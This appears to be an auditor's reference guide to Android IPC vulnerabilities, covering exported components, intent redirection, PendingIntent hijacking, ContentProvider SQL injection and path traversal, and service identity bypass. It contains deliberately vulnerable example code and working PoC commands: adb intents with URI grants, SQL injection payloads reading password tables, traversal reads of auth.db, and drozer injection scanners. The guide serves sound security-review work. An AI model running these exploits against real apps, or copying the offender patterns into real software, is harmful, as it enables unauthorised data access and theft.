# Android IPC Attack Surface

Load when auditing an Android app's Intent, PendingIntent, ContentProvider, and Service exposure. Covers what to grep for in the manifest + decompiled code, common bypass patterns, and PoC shapes for each vuln class.

Applies to `AndroidManifest.xml` inspection (jadx / apktool output) and Kotlin/Java/smali review. For dynamic IPC discovery, use `drozer` and `objection`; for real exposure PoCs, use `adb shell am`.

## Enumeration — the manifest and dynamic receivers

Static (post-`apktool d`):

```bash
# Exported activities/services/receivers/providers
xmlstarlet sel -N a=http://schemas.android.com/apk/res/android \
  -t -m "//*[@a:exported='true']" -v "name(.)" -o " " -v "@a:name" -n \
  AndroidManifest.xml

# Missing android:exported on components with intent-filter → implicit exports (pre-targetSdk 31)
grep -B1 -A5 '<intent-filter' AndroidManifest.xml | grep -B4 '</intent-filter>' \
  | grep -v 'exported' | head -50

# Permission-protected components
grep -E 'android:permission=|android:readPermission=|android:writePermission=' AndroidManifest.xml
```

Dynamic receivers (post-jadx):

```bash
# registerReceiver flags — RECEIVER_EXPORTED (2) makes any-app callable, RECEIVER_NOT_EXPORTED (4) restricts
grep -rn "registerReceiver" sources/ | grep -E "RECEIVER_EXPORTED|Context\.RECEIVER_EXPORTED"
# Android 14+ (targetSdk 34) REQUIRES one of these; missing = crash at runtime — but old builds silently defaulted to EXPORTED
```

Notes:

- `android:exported="false"` + `android:permission=<signature-level perm>` = only apps signed by the same key can invoke. Signature perms are the primary partner-app trust boundary — audit `protectionLevel` in `<permission>` declarations.
- Intent-filter presence on API 30 and below **implicitly exported** the component. On targetSdk ≥ 31 (Android 12+) install fails without an explicit `exported` attribute. Older APKs on newer OS versions keep the implicit behavior — do not assume the exported bit reflects a hard rule.
- `android:grantUriPermissions="true"` on a non-exported provider is still exploitable if any exported component forwards an `Intent` with `FLAG_GRANT_READ_URI_PERMISSION` targeting that provider — read-any-file becomes possible.

## Intent redirection

**Pattern (offender)**:

```java
Intent forward = getIntent().getParcelableExtra("next");   // untrusted
startActivity(forward);                                    // no validation
```

Or the `Parcelable` variant used across `IActivityManager` calls that surfaces internally-scoped components:

```java
Intent nested = intent.getParcelableExtra("EXTRA_INTENT");
sendBroadcast(nested);
```

**Impact**: attacker crafts an intent targeting a private component (e.g. `LoginActivity` with `EXTRA_TOKEN`) or attaches `FLAG_GRANT_READ_URI_PERMISSION` + a `content://com.victim.provider/...` URI — the vulnerable app relays the intent, delegating its permissions to the attacker.

**Static hunt**:

```bash
grep -rEn "getParcelableExtra\(.*Intent\.class|getParcelableExtra\(.*\"[^\"]+\"\s*\)" sources/
grep -rEn "startActivity\(|startService\(|sendBroadcast\(|bindService\(" sources/ \
  | xargs -I{} sh -c 'grep -B10 {} sources/... | head -30'   # correlate near a getParcelableExtra site
```

Look for `IntentSanitizer` usage — its absence around a nested intent is the tell. Presence of `sanitizeByFiltering()` (vs `sanitizeByThrowing()`) is weaker: filtering silently strips policy-violating fields but still launches; auditor must verify that the allowlist actually excludes URI grant flags and cross-package targets.

**PoC (from an attacker app or `adb shell am`)**:

```bash
adb shell am start -n com.victim/.EntryActivity \
    --es action share \
    --esn EXTRA_NESTED_INTENT \
    -a 'android.intent.action.VIEW' \
    -d 'content://com.victim.provider/secrets/1' \
    --grant-read-uri-permission
```

Or programmatically (from the attacker app):

```kotlin
val nested = Intent(Intent.ACTION_VIEW, Uri.parse("content://com.victim.provider/private/1")).apply {
    flags = Intent.FLAG_GRANT_READ_URI_PERMISSION or Intent.FLAG_GRANT_WRITE_URI_PERMISSION
}
val outer = Intent().apply {
    component = ComponentName("com.victim", "com.victim.EntryActivity")
    putExtra("EXTRA_NESTED_INTENT", nested)
}
startActivity(outer)
```

## PendingIntent hijacking

**Pattern (offender)**:

```java
Intent implicit = new Intent("com.victim.ACTION_REPLY");   // no component
PendingIntent pi = PendingIntent.getBroadcast(
    ctx, 0, implicit,
    PendingIntent.FLAG_MUTABLE | PendingIntent.FLAG_UPDATE_CURRENT
);
notification.addAction(pi);                                // exposed via notification
```

The recipient (a notification handler, another app via `send()`) can modify the wrapped intent — add extras, change component, redirect the delivery — and the intent runs with the *creator*'s UID/permissions.

**Impact**: If `FLAG_MUTABLE` + implicit component, any code that receives the `PendingIntent` can rewrite it to fire at any of the creator app's exported components, or use the creator's `URI_PERMISSION` grant chain.

**Static hunt**:

```bash
grep -rEn "PendingIntent\.(getActivity|getBroadcast|getService)" sources/ \
  | grep -v "FLAG_IMMUTABLE"
grep -rEn "FLAG_MUTABLE" sources/ | while read L; do
    # verify: is the underlying Intent implicit? Grep for the Intent constructor 20 lines above.
    echo "$L"
done
```

Findings to flag:

- `FLAG_MUTABLE` + `Intent` constructor without a `Component`/`ComponentName`/explicit package.
- `FLAG_MUTABLE` on API < 31: mutable was the historical default; explicit `FLAG_MUTABLE` here is fine only if the intent is explicit.
- No flag at all + targetSdk < 34: pre-Android 14 the default was mutable-if-updated. `IllegalArgumentException` is thrown on Android 14+ for `getBroadcast`/`getService`/`getActivity` without one of the flags — modern apps must have it, older APKs are still exploitable.

**PoC**: intercept a notification via an accessibility service, or receive a `PendingIntent` via `Slice`/`RemoteInput`, and call `pi.send(context, code, redirect)` where `redirect` has `component = ComponentName("com.victim", "com.victim.PrivateActivity")` and extras controlled by the attacker.

## ContentProvider issues

### Missing / permissive `exported`

```bash
xmlstarlet sel -N a=http://schemas.android.com/apk/res/android \
  -t -m '//provider' -v "@a:name" -o "|" -v "@a:authorities" -o "|" -v "@a:exported" \
  -o "|" -v "@a:grantUriPermissions" -o "|" -v "@a:readPermission" -o "|" -v "@a:writePermission" -n \
  AndroidManifest.xml
```

Red flags:

- `exported="true"` without `readPermission`/`writePermission` → any app queries/writes.
- `grantUriPermissions="true"` even on `exported="false"` provider → intent-forwarding chain can leak.
- No `pathPermission` scoping on providers that expose multiple sensitive paths.

### SQL injection in `query()` / `update()` / `delete()`

**Pattern (offender)**:

```java
public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String order) {
    String table = uri.getLastPathSegment();
    String sql = "SELECT * FROM " + table + " WHERE " + sel + " ORDER BY " + order;
    return db.rawQuery(sql, null);
}
```

Or the subtler `SQLiteQueryBuilder` without `setProjectionMap(...)` — any column name in `projection` reaches the DB.

**Impact**: attacker provider consumer (or attacker web view with a `content://` URI) reads arbitrary tables via `selection`/`sortOrder` injection, or via projection abuse (`"* FROM secrets --"` in `projection[0]`).

**Static hunt**:

```bash
grep -rEn "rawQuery\(|execSQL\(" sources/ | head
grep -rEn "SQLiteQueryBuilder|projectionMap|setStrict" sources/
```

Absence of `setProjectionMap` in an exported provider = high suspicion. `setStrict(true)` / `setStrictColumns(true)` / `setStrictGrammar(true)` (added SDK 24/26) are the compiler-side defenses; audit whether they're actually enabled at runtime for the provider's query paths.

**PoC**:

```bash
adb shell content query --uri content://com.victim.provider/users \
    --projection "'; SELECT password FROM auth --"
adb shell content query --uri content://com.victim.provider/users \
    --where "1=1 UNION SELECT password FROM auth --"
```

### Path traversal in `openFile()` / `openAssetFile()`

**Pattern (offender)**:

```kotlin
override fun openFile(uri: Uri, mode: String): ParcelFileDescriptor {
    val name = uri.lastPathSegment ?: throw FileNotFoundException()
    val f = File(context.filesDir, name)             // no canonicalization / prefix check
    return ParcelFileDescriptor.open(f, ParcelFileDescriptor.MODE_READ_ONLY)
}
```

**Impact**: `content://com.victim.files/..%2F..%2Fdatabases%2Fauth.db` returns an FD to any file the app process can read. Common gadget for arbitrary file read out of `/data/data/com.victim/`.

**Static hunt**:

```bash
grep -rEn "openFile\(|openAssetFile\(|ParcelFileDescriptor\.open" sources/
# Look for missing File.canonicalPath / startsWith checks around the resolved path
```

**PoC**:

```bash
adb shell run-as com.attacker cat /proc/self/status   # confirm attacker package UID
# From attacker Kotlin:
contentResolver.openInputStream(Uri.parse("content://com.victim.files/../databases/auth.db"))?.use {
    it.copyTo(outFile.outputStream())
}
```

## Service caller-UID/signature bypass

**Pattern (offender — "signature check" that isn't)**:

```java
@Override public IBinder onBind(Intent i) {
    String pkg = i.getStringExtra("caller");             // attacker-controlled
    if (isTrusted(pkg)) return binder;                    // wrong: trust caller-supplied identity
    return null;
}
```

**Correct pattern**:

```java
int uid = Binder.getCallingUid();
String[] pkgs = pm.getPackagesForUid(uid);              // authoritative
for (String pkg in pkgs) {
    Signature[] sigs = pm.getPackageInfo(pkg, PackageManager.GET_SIGNING_CERTIFICATES)
        .signingInfo.apkContentsSigners;
    if (matchesTrustedFingerprint(sigs)) return binder;
}
```

**Static hunt**:

```bash
grep -rEn "Binder\.getCallingUid\(|getPackagesForUid\(|GET_SIGNING_CERTIFICATES|signingInfo" sources/
grep -rEn "getIntent\(\)\.getStringExtra\(.*(caller|package|uid|from)" sources/
```

Any auth decision using extras or `getCallingPackage()` (spoofable in some Android versions) without a UID/signature cross-check = trust-boundary bypass.

## `onNewIntent` state pollution

**Pattern (offender)**:

```kotlin
override fun onNewIntent(newIntent: Intent) {
    super.onNewIntent(newIntent)
    // FORGOT: intent = newIntent
    processExtras()               // reads getIntent().extras — still the ORIGINAL cold-start intent
}
```

Or the inverse:

```kotlin
override fun onNewIntent(newIntent: Intent) {
    super.onNewIntent(newIntent)
    intent = newIntent
    processExtras()               // no validation of newIntent
}
```

**Impact**: attacker delivers a crafted intent to a `singleTop`/`singleTask` activity that skips the normal auth flow (which ran only in `onCreate`), reaching post-auth state with attacker-controlled parameters.

**Static hunt**:

```bash
grep -rEn "override fun onNewIntent|void onNewIntent" sources/
# Also check launchMode: singleTop, singleTask, singleInstance activities are candidates
grep -rEn "android:launchMode=" AndroidManifest.xml
```

Correlate against `onCreate` — auth/validation should be factored out and called from both.

## `WebView` + `addJavascriptInterface` (mentioned briefly)

Not strictly IPC, but the trust boundary is analogous — a `JavaScriptInterface`-annotated method exposes the app's UID to any page the WebView loads. Grep:

```bash
grep -rEn "addJavascriptInterface\(|@JavascriptInterface" sources/
grep -rEn "setJavaScriptEnabled\(true\)|setAllowFileAccessFromFileURLs\(true\)|setAllowUniversalAccessFromFileURLs\(true\)" sources/
```

Each `setAllow*FromFileURLs(true)` on a WebView that loads any attacker-controllable URL = cross-origin read via `file://` gadget.

## Runtime enumeration cheatsheet

```bash
# Drozer (community fork WithSecureLabs/drozer)
dz> run app.package.attacksurface com.victim.app
dz> run app.provider.info -a com.victim.app
dz> run app.provider.query content://com.victim.provider/users
dz> run app.provider.finduri com.victim.app
dz> run app.activity.info -a com.victim.app -u
dz> run app.service.info -a com.victim.app -u
dz> run app.broadcast.info -a com.victim.app -u
dz> run scanner.provider.injection -a com.victim.app
dz> run scanner.provider.traversal -a com.victim.app

# adb — one-shot Intent probing
adb shell am start -n com.victim/.PrivateActivity --es token TEST
adb shell am startservice -n com.victim/.PrivateService
adb shell am broadcast -a com.victim.ACTION_RESET
adb shell content query --uri content://com.victim.provider/table
adb shell content insert --uri content://com.victim.provider/table --bind name:s:hax

# objection — patch and hook
objection -g com.victim.app explore
> android hooking list activities
> android hooking watch class_method com.victim.SecureBoundService.onBind
```

## Triage summary

| Finding | Signal | Impact tier |
|---------|--------|-------------|
| Exported activity forwards attacker-supplied `Intent` extra | `getParcelableExtra` → `startActivity`, no `IntentSanitizer` | Cross-app grant of internal permissions, URI grant escalation |
| `PendingIntent.FLAG_MUTABLE` on implicit intent | Grep flags near an implicit `Intent(...)` | Attacker rewrites target → runs as creator UID |
| Exported provider with no projection map / no permission | `<provider android:exported="true">` + `rawQuery` | SQLi → arbitrary DB read/write |
| Provider `openFile` without canonicalization | `uri.lastPathSegment` joined to `filesDir` | Arbitrary file read from `/data/data/pkg/` |
| Service trusts caller-supplied package name | `getStringExtra("caller")` in auth path | Impersonation of trusted partner app |
| `onNewIntent` bypasses `onCreate` validation | `singleTop`/`singleTask` + auth only in `onCreate` | Post-auth state reached with attacker input |
| Runtime `registerReceiver` without `RECEIVER_NOT_EXPORTED` | Grep dynamic registrations | Any app broadcasts to internal receiver |

Escalate to `mobile-technique` §Traffic interception and `offensive-web-role` once the exposed IPC surfaces a backend API path.
